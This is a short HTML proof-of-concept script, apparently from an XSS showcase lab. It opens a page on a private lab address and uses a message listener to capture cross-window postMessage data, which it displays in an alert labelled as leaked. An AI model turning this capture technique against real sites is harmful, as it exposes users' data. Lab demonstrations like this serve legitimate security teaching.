<script>
function listener(event) {
alert( "leaked: " + event.data );
}
window.addEventListener("message", listener);
var xxx = window.open("http://192.168.5.4/hack/xssshowcase/src/xss-showcase-108.php");
</script>